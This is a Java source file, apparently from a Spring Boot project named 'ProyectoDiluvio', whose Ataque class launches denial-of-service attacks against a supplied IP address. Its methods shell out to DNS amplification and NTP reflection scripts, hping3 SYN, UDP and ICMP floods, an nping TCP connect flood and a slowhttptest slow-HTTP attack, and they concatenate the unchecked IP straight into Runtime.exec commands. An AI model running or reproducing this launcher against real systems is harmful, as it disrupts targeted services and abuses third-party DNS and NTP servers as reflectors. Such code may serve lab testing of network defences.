package com.diluvio.attacks;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Ataque {

	
	public static String dnsAttack(String direccionIP) {
		ejecutarFile( "python /home/test/eclipse-springboot/ProyectoDiluvio/dns_amplification.py", direccionIP);
		return "DNS Reflection enviado a "+direccionIP;
		
	}
	
	public static String synFloodAttack(String direccionIP) {
		String instruccion = "hping3 -p 80 -c 10 -S --fast ";
		 ejecutarInstruccion(instruccion, direccionIP);
		return "Syn flood enviado a "+direccionIP;
		
	}
	
	public static String udpFloodAttack(String direccionIP) {
		String instruccion = "hping3 -c 10 -2 --faster ";
		 ejecutarInstruccion(instruccion, direccionIP);
		return "UDP flood enviado a "+direccionIP;
		
	}

	public static String ntpAttack(String direccionIP) {
		String instruccion1 = "python /home/test/eclipse-springboot/ProyectoDiluvio/ntpattack.py";
		String instruccion2 = "/home/test/eclipse-springboot/ProyectoDiluvio/listNTP 1";
		 ejecutarDosInstrucciones(instruccion1,instruccion2, direccionIP);
		return "NTP Attack enviado a "+direccionIP;
		
	}
	
	public static String icmpFloodAttack(String direccionIP) {
		String instruccion = "hping3 -c 10 -1 -C 17 ";
		 ejecutarInstruccion(instruccion, direccionIP);
		return "ICMP flood enviado a "+direccionIP;
		
	}
	
	public static String tcpConnectFlood(String direccionIP) {
		String instruccion = "nping --tcp-connect -rate=10 -c 10 ";
		 ejecutarInstruccion(instruccion, direccionIP);
		return "TCP Connect Flood enviado a "+direccionIP;
		
	}
	
	public static String slowhttpAttack(String direccionIP) {
		String instruccion = "slowhttptest -c 20 -H -i 1 -r 2 -u http://";
		 ejecutarInstruccion(instruccion, direccionIP);
		return "Slow http Attack enviado a "+direccionIP;
		
	}
	
	
	
	private static void ejecutarInstruccion(String instruccion,String IP) {
		
		
        String s="";
        Process p;
        try {
            p = Runtime.getRuntime().exec(instruccion+IP);
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
                System.out.println("line: " + s);
            p.waitFor();
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) 
        {
        	e.printStackTrace();
        }
    

		}
	
	private static void ejecutarDosInstrucciones(String instruccion1,String instruccion2,String IP) {
		
		
        String s="";
        Process p;
        try {
            p = Runtime.getRuntime().exec(instruccion1+" "+IP+" "+instruccion2);
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
                System.out.println("line: " + s);
            p.waitFor();
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) 
        {
        	e.printStackTrace();
        }
    

		}
	
	private static void ejecutarFile(String path,String IP) {

		
		try {

			Process p = Runtime.getRuntime().exec(path + " "+IP );
			System.out.println(p);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    

		}



}

